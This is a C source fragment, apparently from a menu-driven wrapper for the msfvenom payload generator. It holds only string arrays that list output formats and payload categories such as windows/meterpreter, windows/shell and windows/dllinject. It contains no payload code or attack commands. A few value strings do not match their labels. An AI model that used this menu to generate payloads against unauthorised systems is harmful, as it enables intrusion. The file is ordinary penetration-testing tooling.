char	msfv_formats_9[]	= "    dw                  msi                 rsh\n";
char	msfv_formats_10[]	= "    dword               msi_nouac           vba\n";
char	msfv_formats_11[]	= "    elf                 num                 vba-exe\n";
char	msfv_formats_12[]	= "    elf-so              osx-app             vba-psh\n";
char	msfv_formats_13[]	= "    exe                 perl                vbapplicaton\n";
char	msfv_formats_14[]	= "    exe-only            pl                  vbs\n";
char	msfv_formats_15[]	= "    exe-service         powershell          vbscript\n";
char	msfv_formats_16[]	= "    exe-small           ps1                 war\n";
char	msfv_formats_17[]	= "    hta-psh             psh                 \n";

char	msfv_formats_18[]	= "    \n\n";
char 	msfv_formats_str[] 	= " To return menu type [0] : "; 
    

//msfvenom --list payloads
char	msfv_payloads_sp[]	= " ---------\n";
char 	msfv_payloads_str[] 	= "Selecte your payload type : "; 
char 	msfv_payloads_0[]  	= " [0]   Exit\n"; 
char	msfv_payloads_1[]	= " [1]   aix/\n";
char	msfv_payloads_2[]	= " [2]   android/\n";
char	msfv_payloads_3[]	= " [3]   apple_ios/\n";
char	msfv_payloads_4[]	= " [4]   bsd/\n";
char	msfv_payloads_5[]	= " [5]   bsdi/\n";
char	msfv_payloads_6[]	= " [6]   cmd/mainframe\n";
char	msfv_payloads_7[]	= " [7]   cmd/unix\n";
char	msfv_payloads_8[]	= " [8]   cmd/windows\n";
char	msfv_payloads_9[]	= " [9]   firefox/\n";
char	msfv_payloads_10[]	= " [10]  generic/\n";
char	msfv_payloads_11[]	= " [11]  java/\n";
char	msfv_payloads_12[]	= " [12]  linux/aarch64\n";
char	msfv_payloads_13[]	= " [13]  linux/armbe\n";
char	msfv_payloads_14[]	= " [14]  linux/armle\n";
char	msfv_payloads_15[]	= " [15]  linux/mips64\n";
char	msfv_payloads_16[]	= " [16]  linux/mipsbe\n";
char	msfv_payloads_17[]	= " [17]  linux/mipsle\n";
char	msfv_payloads_18[]	= " [18]  linux/ppc\n";
char	msfv_payloads_19[]	= " [19]  linux/ppc64\n";
char	msfv_payloads_20[]	= " [20]  linux/ppc64le\n";
char	msfv_payloads_21[]	= " [21]  linux/x64\n";
char	msfv_payloads_22[]	= " [22]  linux/x86\n";
char	msfv_payloads_23[]	= " [23]  linux/zarch\n";
char	msfv_payloads_24[]	= " [24]  multi/\n";
char	msfv_payloads_25[]	= " [25]  netware/\n";
char	msfv_payloads_26[]	= " [26]  nodejs/\n";
char	msfv_payloads_27[]	= " [27]  osx/\n";
char	msfv_payloads_28[]	= " [28]  php/\n";
char	msfv_payloads_29[]	= " [29]  python/\n";
char	msfv_payloads_30[]	= " [30]  r/\n";
char	msfv_payloads_31[]	= " [31]  ruby/\n";
char	msfv_payloads_32[]	= " [32]  solaris/\n";
char	msfv_payloads_33[]	= " [33]  tty\n";
char	msfv_payloads_34[]	= " [34]  windows\n";
char	msfv_payloads_35[]	= " [35]  windows/dllinject/\n";
char	msfv_payloads_36[]	= " [36]  windows/encrypted_shell\n";
char	msfv_payloads_37[]	= " [37]  windows/exec\n";
char	msfv_payloads_38[]	= " [38]  windows/meterpreter\n";
char	msfv_payloads_39[]	= " [39]  windows/patchupdllinject\n";
char	msfv_payloads_40[]	= " [40]  windows/patchupmeterpreter\n";
char	msfv_payloads_41[]	= " [41]  windows/pingback\n";
char	msfv_payloads_42[]	= " [42]  windows/powershell\n";
char	msfv_payloads_43[]	= " [43]  windows/shell\n";
char	msfv_payloads_44[]	= " [44]  windows/upexec\n";
char	msfv_payloads_45[]	= " [45]  windows/vncinject/\n";
char	msfv_payloads_46[]	= " [46]  windows/x64\n";
char	msfv_payloads_47[]	= "    \n\n";
    
    
char	Vmsfv_payloads_1[]	= "aix/";
char	Vmsfv_payloads_2[]	= "android/";
char	Vmsfv_payloads_3[]	= "apple_ios/";
char	Vmsfv_payloads_4[]	= "bsd/";
char	Vmsfv_payloads_5[]	= "bsdi/";
char	Vmsfv_payloads_6[]	= "cmd/mainframe";
char	Vmsfv_payloads_7[]	= "cmd/unix";
char	Vmsfv_payloads_8[]	= "cmd/windows";
char	Vmsfv_payloads_9[]	= "firefox/";
char	Vmsfv_payloads_10[]	= "generic/";
char	Vmsfv_payloads_11[]	= "java/";
char	Vmsfv_payloads_12[]	= "linux/aarch64";
char	Vmsfv_payloads_13[]	= "linux/armbe";
char	Vmsfv_payloads_14[]	= "linux/armle";
char	Vmsfv_payloads_15[]	= "linux/mips64";
char	Vmsfv_payloads_16[]	= "linux/mipsbe";
char	Vmsfv_payloads_17[]	= "linux/mipsle";
char	Vmsfv_payloads_18[]	= "linux/ppc";
char	Vmsfv_payloads_19[]	= "linux/ppc64";
char	Vmsfv_payloads_20[]	= "linux/ppc64le";
char	Vmsfv_payloads_21[]	= "linux/x64";
char	Vmsfv_payloads_22[]	= "linux/x86";
char	Vmsfv_payloads_23[]	= "linux/zarch";
char	Vmsfv_payloads_24[]	= "multi/";
char	Vmsfv_payloads_25[]	= "netware/";
char	Vmsfv_payloads_26[]	= "nodejs/";
char	Vmsfv_payloads_27[]	= "osx/";
char	Vmsfv_payloads_28[]	= "php/";
char	Vmsfv_payloads_29[]	= "python/";
char	Vmsfv_payloads_30[]	= "r/s";
char	Vmsfv_payloads_31[]	= "ruby/";
char	Vmsfv_payloads_32[]	= "solaris/";
char	Vmsfv_payloads_33[]	= "tty/";
char	Vmsfv_payloads_34[]	= "windows";
char	Vmsfv_payloads_35[]	= "windows/dllinject";
char	Vmsfv_payloads_36[]	= "windows/encrypted_shell";
char	Vmsfv_payloads_37[]	= "windows/exec";
char	Vmsfv_payloads_38[]	= "windows/meterpreter";
char	Vmsfv_payloads_39[]	= "windows/patchupdllinject";
char	Vmsfv_payloads_40[]	= "windows/patchupmeterpreter";
char	Vmsfv_payloads_41[]	= "windows/pingback";
char	Vmsfv_payloads_42[]	= "windows/powershell";
char	Vmsfv_payloads_43[]	= "windows/shell";
char	Vmsfv_payloads_44[]	= "windows/upexec";
char	Vmsfv_payloads_45[]	= "windows/vncinject";
char	Vmsfv_payloads_46[]	= "windows/x64";


    
    
    
    
    
    
    
    




